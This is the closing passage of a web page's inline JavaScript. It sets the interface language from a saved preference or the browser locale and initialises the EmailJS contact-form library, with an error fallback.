                const savedLang = localStorage.getItem('preferredLanguage');
                const browserLang = navigator.language.split('-')[0];
                const validLangs = ['tr', 'de', 'en', 'fr', 'es', 'ar'];
                const initialLang = savedLang || (validLangs.includes(browserLang) ? browserLang : 'tr');
                setLanguage(initialLang);
                
                try { emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY }); }
                catch (e) { console.error("Could not initialize EmailJS. Is the public key correct?", e); showStatusMessage("status_fail_init", false); }
            };

            initialize();
        });
    </script>

</body></html>




